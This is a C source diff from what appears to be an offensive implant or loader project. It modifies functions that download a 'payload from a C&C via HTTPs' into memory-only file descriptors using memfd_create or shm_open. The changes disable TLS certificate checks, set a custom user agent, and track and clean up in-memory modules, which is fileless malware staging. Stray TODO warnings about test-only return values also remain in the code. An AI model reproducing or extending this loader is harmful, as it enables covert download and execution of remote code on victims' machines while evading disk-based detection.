@@ -87,8 +87,8 @@ int checKernel() {
 	}
 	else if ( memfd_kv_s.major > 3){
         if (memfdcheck == 1) {
-            memfd_kv_s.memfd_supp = 0;// TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
-            return 0; // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
+            memfd_kv_s.memfd_supp = 1;// TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
+            return 1; // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
         }
         memfd_kv_s.memfd_supp = 0;
 	}
@@ -99,8 +99,8 @@ int checKernel() {
 	}
 	else {
         if (memfdcheck == 1) {
-            memfd_kv_s.memfd_supp = 0;  // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
-            return 0; // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
+            memfd_kv_s.memfd_supp = 1;  // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
+            return 1; // TODO: WARNING!!!! only set to 0 for shm testing. change it back to 1 for proper.
         }
         memfd_kv_s.memfd_supp = 0;
         return 0;
@@ -122,92 +122,82 @@ void gen_random(char *s, const int len) {
 
 
 // Returns a file descriptor where we can write our shared object
-int open_ramfs(void) {
+int open_ramfs(Shared_Mem_Fd * smf) {
 
     int shm_fd = 0;
     char s[6] = {};
 
+    gen_random(s, 6);
+
 	if (memfd_kv_s.memfd_supp == 0) {
-        gen_random(s, 6);
-		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRWXU);
+		shm_fd = shm_open(s, O_RDWR | O_CREAT, S_IRUSR|S_IRUSR|S_IRGRP|S_IRGRP|S_IRGRP|S_IRGRP);
 		if (shm_fd < 0) { 
 			log_fatal("RamWorker: shm_fd: Could not open file descriptor");
 			return 0;
 		}
+        smf->shm_type=1; //shm
 	}
 	else {
-        gen_random(s, 6);
 		shm_fd = memfd_create(s, 1); // flags?
 		if (shm_fd < 0) { 
 			log_fatal("RamWorker: memfd_create: Could not open file descriptor\n");
 			return 0;
 		}
+        smf->shm_type=2; //memfd
 	}
+
+    smf->shm_fd=shm_fd;
+    memcpy(smf->shm_mname, s, 6);
 	return shm_fd;
 }
 
-// Callback to write the shared object
-static size_t write_data (void *ptr, size_t size, size_t nmemb, void* userp) {
-
-    Shared_Mem_Fd *shm_fd_s = (Shared_Mem_Fd *)userp;
-	if (write(shm_fd_s->shm_fd, ptr, nmemb) < 0) {
-		log_fatal("cURL Writer: Could not write shm file.");
-		close(shm_fd_s->shm_fd);
-		return 1;
-	}
-	log_debug("cURL Writer: SHM file written");
-
-    return CURLE_OK;
-}
-
-// Download our share object from a C&C via HTTPs
+// Download payload from a C&C via HTTPs
 int download_to_RAM(char *downloadUrl, char *fileName) { 
 
 	CURL *curl;
 	CURLcode res;
 	int shm_fd = 0;
+    FILE * shm_file;
+    Shared_Mem_Fd shm_fd_s = {
+        .shm_fd=0, 
+        .shm_fname={0}, 
+        .shm_mname={0}, 
+        .shm_type=0 
+    };
 
-	shm_fd = open_ramfs(); // Give me a file descriptor to memory
+    // Save fileName in object record
+    if ( strlen(fileName) < SHM_NAME_MAX ){
+        memcpy(shm_fd_s.shm_fname, fileName, strlen(fileName) );
+    }else{
+        memcpy(shm_fd_s.shm_fname, fileName, SHM_NAME_MAX -1 );
+    }
 
-    if (shm_fd == 0){ // memory not allocated - return
+	shm_fd = open_ramfs(&shm_fd_s); // Give me a file descriptor to memory
+
+    if ( shm_fd == 0 || shm_fd_s.shm_fd == 0){ // memory not allocated - return
 	    log_debug("RamWorker: File Descriptor Shared Memory NOT created! Bailing.");
         return shm_fd;
     }
 
-	log_info("RamWorker: File Descriptor %d Shared Memory created", shm_fd);
-
-    Shared_Mem_Fd shm_fd_s = {.shm_fd=0, .shm_name={0} };
-    shm_fd_s.shm_fd=shm_fd;
-
-    // needed even?
-    if ( strlen(fileName) < SHM_NAME_MAX ){
-        memcpy(shm_fd_s.shm_name, fileName, strlen(fileName) );
-    }else{
-        memcpy(shm_fd_s.shm_name, fileName, SHM_NAME_MAX -1 );
-    }
-
-
+	log_info("RamWorker: File Descriptor %d Shared Memory created", shm_fd_s.shm_fd);
 	log_debug("RamWorker: Passing URL to cURL: %s", downloadUrl);
 
     curl_global_init(CURL_GLOBAL_DEFAULT);    
-	// We use cURL to download the file
-	// It's easy to use and we avoid to write unnecesary code
 	curl = curl_easy_init();
 	if (curl) {
 		curl_easy_setopt(curl, CURLOPT_URL, downloadUrl);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
 		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
 		curl_easy_setopt(curl, CURLOPT_USERAGENT, ZCURL_AGENT);
-		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); //Callback
-        
-        // Op_Nomad: Modded to avoid gcc warning 
-		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*) &shm_fd_s); //Args for our callback
+       
+        // WARNING: fdopen(3) The result of applying fdopen() to a shared memory object is undefined. 
+        shm_file=fdopen(shm_fd_s.shm_fd, "w"); 
+		curl_easy_setopt(curl, CURLOPT_WRITEDATA, shm_file); 
 		
-		// Do the HTTPs request!
 		res = curl_easy_perform(curl);
 		if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
 			log_error("cURL: cURL failed: %s", curl_easy_strerror(res));
-            cleanup_os_resources(shm_fd);
+            cleanup_mod_resources(shm_fd);
             return 0;
 		}
 		curl_easy_cleanup(curl);
@@ -217,7 +207,7 @@ int download_to_RAM(char *downloadUrl, char *fileName) {
     return shm_fd;
 }
 
-void cleanup_os_resources(int shm_fd){
+void cleanup_mod_resources(int shm_fd){
 
     char procpath[1024];
     char *shmpath;
@@ -233,7 +223,7 @@ void cleanup_os_resources(int shm_fd){
             if (shmpath != NULL)
             {
                 log_info("Cleanup: unlinking %s -> %s", procpath, shmpath);
-                unlink(shmpath);
+                unlink(shmpath); // TODO: make provisions for shm_unlink
                 free(shmpath);
             }
         }
@@ -665,9 +655,9 @@ int unload_mod(node_t * head, char * name) {
        log_debug("Worker: Module fd found %d", modfd);
        status = 1;
        log_debug("Worker: Closing OS process fd %d", modfd);
-       close(modfd);      // close from OS
-       log_debug("Worker: Removing data from memory for fd %d", modfd);
-       mark_delete_mod(head, modfd); // from ShmMemTbl
+       cleanup_mod_resources(modfd);
+       //log_debug("Worker: Removing data from memory for fd %d", modfd);
+       //mark_delete_mod(head, modfd); // from ShmMemTbl
     }else{
        log_debug("Worker: Module fd not found");
     }
